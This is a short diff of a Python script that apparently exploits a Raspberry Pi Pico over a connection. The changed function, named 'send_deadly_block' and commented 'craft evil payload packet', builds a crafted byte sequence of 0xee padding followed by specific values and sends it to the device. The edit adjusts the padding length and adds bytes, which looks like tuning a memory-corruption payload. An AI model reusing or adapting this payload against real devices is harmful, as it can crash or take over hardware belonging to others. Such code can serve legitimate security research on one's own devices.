@@ -4,9 +4,9 @@ from time import time_ns
 # craft evil payload packet
 def send_deadly_block(s):
     data = []
-    for i in range(32):
+    for i in range(28):
         data += [0xee]
-    data += [0x6d, 0x03, 0x00, 0x10]
+    data += [0x00, 0x00, 0x0a, 0xff, 0xee, 0xee, 0xee, 0xee, 0x6d, 0x03, 0x00, 0x10]
     send_block(s, bytearray(data))
 
 # send a block of data to the pico
